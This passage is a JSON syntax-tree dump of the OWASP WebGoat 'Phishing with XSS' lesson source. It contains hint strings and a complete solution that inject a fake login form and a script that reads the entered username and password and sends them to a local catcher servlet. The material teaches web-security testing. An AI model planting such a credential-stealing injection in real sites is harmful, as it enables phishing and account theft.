Username:\u0026lt;br\u0026gt;\u0026lt;input type\u003d\u0026quot;text\u0026quot; name\u003d\u0026quot;user\u0026quot;\u0026gt;\u0026lt;br\u0026gt;Enter Password:\u0026lt;br\u0026gt;\u0026lt;input type\u003d\u0026quot;password\u0026quot; name \u003d \u0026quot;pass\u0026quot;\u0026gt;\u0026lt;br\u0026gt;\u0026lt;input type\u003d\u0026quot;submit\u0026quot; name\u003d\u0026quot;login\u0026quot; value\u003d\u0026quot;login\u0026quot; onclick\u003d\u0026quot;hack()\u0026quot;\u0026gt;\u0026lt;/form\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;HR\u0026gt;","raw":"Complete solution for this lesson:\u003cBR\u003e\u003cBR\u003e\u0026lt;/form\u0026gt;\u0026lt;script\u0026gt;function hack(){ XSSImage\u003dnew Image; XSSImage.src\u003d\u0026quot;http://localhost/webgoat/catcher?PROPERTY\u003dyes\u0026amp;user\u003d\u0026quot;+document.phish.user.value + \u0026quot;\u0026amp;password\u003d\u0026quot; + document.phish.pass.value + \u0026quot;\u0026quot;;alert(\u0026quot;Had this been a real attack... Your credentials were just stolen.\nUser Name \u003d \u0026quot; + document.phish.user.value + \u0026quot;\nPassword \u003d \u0026quot; +  document.phish.pass.value);} \u0026lt;/script\u0026gt;\u0026lt;form name\u003d\u0026quot;phish\u0026quot;\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;HR\u0026gt;\u0026lt;H3\u0026gt;This feature requires account login:\u0026lt;/H2\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;Enter Username:\u0026lt;br\u0026gt;\u0026lt;input type\u003d\u0026quot;text\u0026quot; name\u003d\u0026quot;user\u0026quot;\u0026gt;\u0026lt;br\u0026gt;Enter Password:\u0026lt;br\u0026gt;\u0026lt;input type\u003d\u0026quot;password\u0026quot; name \u003d \u0026quot;pass\u0026quot;\u0026gt;\u0026lt;br\u0026gt;\u0026lt;input type\u003d\u0026quot;submit\u0026quot; name\u003d\u0026quot;login\u0026quot; value\u003d\u0026quot;login\u0026quot; onclick\u003d\u0026quot;hack()\u0026quot;\u0026gt;\u0026lt;/form\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;HR\u0026gt;"}],"loc":{"start":{"line":216},"end":{"line":227}}},"loc":{"start":{"line":216},"end":{"line":227}}},{"type":"ReturnStatement","argument":{"type":"Identifier","name":"hints","loc":{"start":{"line":249},"end":{"line":249}}},"loc":{"start":{"line":249},"end":{"line":249}}}],"loc":{"start":{"line":167},"end":{"line":250}}},"code":"\nprotected List\u003cString\u003e getHints(WebSession s) {\n    List\u003cString\u003e hints \u003d new ArrayList\u003cString\u003e();\n    hints.add(\"Try adding HTML to the search field to create a fake authentication form.\u003cBR\u003eTry to make the form look official.\");\n    hints.add(\"Try: \u003cBR\u003e \u0026lt;form name\u003d\u0026quot;phish\u0026quot;\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;HR\u0026gt;\u0026lt;H3\u0026gt;This feature requires account login:\u0026lt;/H2\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;Enter Username:\u0026lt;br\u0026gt;\u0026lt;input type\u003d\u0026quot;text\u0026quot; name\u003d\u0026quot;user\u0026quot;\u0026gt;\u0026lt;br\u0026gt;Enter Password:\u0026lt;br\u0026gt;\u0026lt;input type\u003d\u0026quot;password\u0026quot; name \u003d \u0026quot;pass\u0026quot;\u0026gt;\u0026lt;br\u0026gt;\u0026lt;/form\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;HR\u0026gt;\");\n    hints.add(\"Add functionality that can post a request, a button might work\u003cBR\u003e\u003cBR\u003eAfter getting the button on the page, don\\\u0027t forget you will need to steal the credentials and post them to: \u003cBR\u003ehttp://localhost/webgoat/capture/PROPERTY\u003dyes\u0026ADD_CREDENTIALS_HERE\");\n    hints.add(\"Try: \u003cBR\u003e \u0026lt;input type\u003d\u0026quot;submit\u0026quot; name\u003d\u0026quot;login\u0026quot; value\u003d\u0026quot;login\u0026quot;\u0026gt;\u003cBR\u003e\u003cBR\u003eIn the whole script:\u003cBR\u003e\u003cBR\u003e\u0026lt;form name\u003d\u0026quot;phish\u0026quot;\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;HR\u0026gt;\u0026lt;H3\u0026gt;This feature requires account login:\u0026lt;/H2\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;Enter Username:\u0026lt;br\u0026gt;\u0026lt;input type\u003d\u0026quot;text\u0026quot; name\u003d\u0026quot;user\u0026quot;\u0026gt;\u0026lt;br\u0026gt;Enter Password:\u0026lt;br\u0026gt;\u0026lt;input type\u003d\u0026quot;password\u0026quot; name \u003d \u0026quot;pass\u0026quot;\u0026gt;\u0026lt;br\u0026gt;\u0026lt;input type\u003d\u0026quot;submit\u0026quot; name\u003d\u0026quot;login\u0026quot; value\u003d\u0026quot;login\u0026quot; onclick\u003d\u0026quot;hack()\u0026quot;\u0026gt;\u0026lt;/form\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;HR\u0026gt;\");\n    hints.add(\"Make the button perform an action on submit, \u003cBR\u003eadding an onclick\u003d\\\"hack()\\\" might work\u003cBR\u003eDon\\\u0027t forget to add the hack() javascript function\u003cBR\u003e\u003cBR\u003eIn the whole script:\u003cBR\u003e\u003cBR\u003e\u0026lt;form name\u003d\u0026quot;phish\u0026quot;\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;HR\u0026gt;\u0026lt;H3\u0026gt;This feature requires account login:\u0026lt;/H2\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;Enter Username:\u0026lt;br\u0026gt;\u0026lt;input type\u003d\u0026quot;text\u0026quot; name\u003d\u0026quot;user\u0026quot;\u0026gt;\u0026lt;br\u0026gt;Enter Password:\u0026lt;br\u0026gt;\u0026lt;input type\u003d\u0026quot;password\u0026quot; name \u003d \u0026quot;pass\u0026quot;\u0026gt;\u0026lt;br\u0026gt;\u0026lt;input type\u003d\u0026quot;submit\u0026quot; name\u003d\u0026quot;login\u0026quot; value\u003d\u0026quot;login\u0026quot; onclick\u003d\u0026quot;hack()\u0026quot;\u0026gt;\u0026lt;/form\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;HR\u0026gt;\u003cBR\u003eAlso, check firebug. Does the search form need to be terminated for this to work...? (\u0026lt;/form\u0026gt;)\");\n    hints.add(\"You need to create the hack() function.  This function will pull the credentials from the webpage and post them to the WebGoat catcher servlet. \u003cBR\u003e\u003cBR\u003e Some useful code snippets:\u003cUL\u003e\u003cLI\u003edoucument.phish.user.value - will access the user field\u003cLI\u003eXssImage \u003d new Image(); XssImage.src\u003dSOME_URL \u003d will perform a post\u003cLI\u003ejavascript string concatentation uses a \\\"+\\\" \u003c/UL\u003e\u003cBR\u003e\u003cBR\u003eThe entire javascript portion:\u003cBR\u003e\u003cBR\u003e\u0026lt;script\u0026gt;function hack(){ XSSImage\u003dnew Image; XSSImage.src\u003d\u0026quot;http://localhost/webgoat/catcher?PROPERTY\u003dyes\u0026amp;user\u003d\u0026quot;+document.phish.user.value + \u0026quot;\u0026amp;password\u003d\u0026quot; + document.phish.pass.value + \u0026quot;\u0026quot;;alert(\u0026quot;Had this been a real attack... Your credentials were just stolen.\\nUser Name \u003d \u0026quot; + document.phish.user.value + \u0026quot;\\nPassword \u003d \u0026quot; +  document.phish.pass.value);} \u0026lt;/script\u0026gt;\");\n    hints.add(\"Complete solution for this lesson:\u003cBR\u003e\u003cBR\u003e\u0026lt;/form\u0026gt;\u0026lt;script\u0026gt;function hack(){ XSSImage\u003dnew Image; XSSImage.src\u003d\u0026quot;http://localhost/webgoat/catcher?PROPERTY\u003dyes\u0026amp;user\u003d\u0026quot;+document.phish.user.value + \u0026quot;\u0026amp;password\u003d\u0026quot; + document.phish.pass.value + \u0026quot;\u0026quot;;alert(\u0026quot;Had this been a real attack... Your credentials were just stolen.\\nUser Name \u003d \u0026quot; + document.phish.user.value + \u0026quot;\\nPassword \u003d \u0026quot; +  document.phish.pass.value);} \u0026lt;/script\u0026gt;\u0026lt;form name\u003d\u0026quot;phish\u0026quot;\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;HR\u0026gt;\u0026lt;H3\u0026gt;This feature requires account login:\u0026lt;/H2\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;Enter Username:\u0026lt;br\u0026gt;\u0026lt;input type\u003d\u0026quot;text\u0026quot; name\u003d\u0026quot;user\u0026quot;\u0026gt;\u0026lt;br\u0026gt;Enter Password:\u0026lt;br\u0026gt;\u0026lt;input type\u003d\u0026quot;password\u0026quot; name \u003d \u0026quot;pass\u0026quot;\u0026gt;\u0026lt;br\u0026gt;\u0026lt;input type\u003d\u0026quot;submit\u0026quot; name\u003d\u0026quot;login\u0026quot; value\u003d\u0026quot;login\u0026quot; onclick\u003d\u0026quot;hack()\u0026quot;\u0026gt;\u0026lt;/form\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;HR\u0026gt;\");\n    return hints;\n}","loc":{"start":{"line":166},"end":{"line":250}}},{"type":"FunctionDeclaration","id":{"type":"Identifier","name":"getInstructions"},"modifiers":{"type":"Modifiers","modifiers":["public"],"annotations":[]},"restype":{"type":"Identifier","name":"String","loc":{"start":{"line":257},"end":{"line":257}}},"typarams":[],"params":[{"type":"Identifier","name":"s","vartype":{"type":"Identifier","name":"WebSession","loc":{"start":{"line":257},"end":{"line":257}}}}],"thrown":[],"body":{"type":"BlockStatement","body":[{"type":"VariableDeclarator","id":{"type":"Identifier","name":"instructions","vartype":{"type":"Identifier","name":"String","loc":{"start":{"line":259},"end":{"line":259}}}},"modifiers":{"type":"Modifiers","modifiers":[],"annotations":[]},"vartype":{"type":"Identifier","name":"String","loc":{"start":{"line":259},"end":{"line":259}}},"init":{"type":"Literal","value":"This lesson is an example of how a website might support a phishing attack\u003cBR\u003e\u003cBR\u003eBelow is an example of a standard search feature.\u003cbr\u003eUsing XSS and HTML insertion, your goal is to: \u003cUL\u003e\u003cLI\u003eInsert html to that requests credentials\u003cLI\u003eAdd javascript to actually collect the credentials\u003cLI\u003ePost the credentials to http://localhost/webgoat/catcher?PROPERTY\u003dyes...\u003c/UL\u003e To pass this lesson, the credentials must be posted to the catcher servlet.\u003cBR\u003e","raw":"This lesson is an example of how a website might support a phishing attack\u003cBR\u003e\u003cBR\u003eBelow is an example of a standard search feature.\u003cbr\u003eUsing XSS and HTML insertion, your goal is to: \u003cUL\u003e\u003cLI\u003eInsert html to that requests credentials\u003cLI\u003eAdd javascript to actually collect the credentials\u003cLI\u003ePost the credentials to http://localhost/webgoat/catcher?PROPERTY\u003dyes...\u003c/UL\u003e To pass this lesson, the credentials must be posted to the catcher servlet.\u003cBR\u003e"},"loc":{"start":{"line":259},"end":{"line":265}}},{"type":"ReturnStatement","argument":{"type":"Identifier","name":"instructions","loc":{"start":{"line":267},"end":{"line":267}}},"loc":{"start":{"line":267},"end":{"line":267}}}],"loc":{"start":{"line":258},"end":{"line":268}}},"code":"\npublic String getInstructions(WebSession s) {\n    String instructions \u003d \"This lesson is an example of how a website might support a phishing attack\u003cBR\u003e\u003cBR\u003eBelow is an example of a standard search feature.\u003cbr\u003eUsing XSS and HTML insertion, your goal is to: \u003cUL\u003e\u003cLI\u003eInsert html to that requests credentials\u003cLI\u003eAdd javascript to actually collect the credentials\u003cLI\u003ePost the credentials to http://localhost/webgoat/catcher?PROPERTY\u003dyes...\u003c/UL\u003e To pass this lesson, the credentials must be posted to the catcher servlet.\u003cBR\u003e\";\n    return (instructions);\n}","loc":{"start":{"line":257},"end":{"line":268}}},{"type":"VariableDeclarator","id":{"type":"Identifier","name":"DEFAULT_RANKING","vartype":{"type":"Identifier","name":"Integer","loc":{"start":{"line":270},"end":{"line":270}}}},"modifiers":{"type":"Modifiers","modifiers":["private","static","final"],"annotations":[]},"vartype":{"type":"Identifier","name":"Integer","loc":{"start":{"line":270},"end":{"line":270}}},"init":{"type":"NewExpression","typeargs":[],"callee":{"type":"Identifier","name":"Integer","loc":{"start":{"line":270},"end":{"line":270}}},"arguments":[{"type":"Literal","value":30,"raw":30}],"loc":{"start":{"line":270},"end":{"line":270}}},"loc":{"start":{"line":270},"end":{"line":270}}},{"type":"FunctionDeclaration","id":{"type":"Identifier","name":"getDefaultRanking"},"modifiers":{"type":"Modifiers","modifiers":["protected"],"annotations":[]},"restype":{"type":"Identifier","name":"Integer","loc":{"start":{"line":272},"end":{"line":272}}},"typarams":[],"params":[],"thrown":[],"body":{"type":"BlockStatement","body":[{"type":"ReturnStatement","argument":{"type":"Identifier","name":"DEFAULT_RANKING","loc":{"start":{"line":274},"end":{"line":274}}},"loc":{"start":{"line":274},"end":{"line":274}}}],"loc":{"start":{"line":273},"end":{"line":275}}},"code":"\nprotected Integer getDefaultRanking() {\n    return DEFAULT_RANKING;\n}","loc":{"start":{"line":272},"end":{"line":275}}},{"type":"FunctionDeclaration","id":{"type":"Identifier","name":"getDefaultCategory"},"modifiers":{"type":"Modifiers","modifiers":["protected"],"annotations":[]},"restype":{"type":"Identifier","name":"Category","loc":{"start":{"line":282},"end":{"line":282}}},"typarams":[],"params":[],"thrown":[],"body":{"type":"BlockStatement","body":[{"type":"ReturnStatement","argument":{"type":"MemberExpression","object":{"type":"Identifier","name":"Category","loc":{"start":{"line":284},"end":{"line":284}}},"property":{"type":"Identifier","name":"XSS"},"loc":{"start":{"line":284},"end":{"line":284}}},"loc":{"start":{"line":284},"end":{"line":284}}}],"loc":{"start":{"line":283},"end":{"line":285}}},"code":"\nprotected Category getDefaultCategory() {\n    return Category.XSS;\n}","loc":{"start":{"line":282},"end":{"line":285}}},{"type":"FunctionDeclaration","id":{"type":"Identifier","name":"getTitle"},"modifiers":{"type":"Modifiers","modifiers":["public"],"annotations":[]},"restype":{"type":"Identifier","name":"String","loc":{"start":{"line":292},"end":{"line":292}}},"typarams":[],"params":[],"thrown":[],"body":{"type":"BlockStatement","body":[{"type":"ReturnStatement","argument":{"type":"Literal","value":"Phishing with XSS","raw":"Phishing with XSS"},"loc":{"start":{"line":294},"end":{"line":294}}}],"loc":{"start":{"line":293},"end":{"line":295}}},"code":"\npublic String getTitle() {\n    return (\"Phishing with XSS\");\n}","loc":{"start":{"line":292},"end":{"line":295}}}],"loc":{"start":{"line":54},"end":{"line":297}}}],"loc":{"start":{"line":2},"end":{"line":297}},"sourcefile":"/Users/gli/codiscope/jacks.engine/WebGoat-5.4/WEB-INF/classes/org/owasp/webgoat/lessons/Phishing.java"}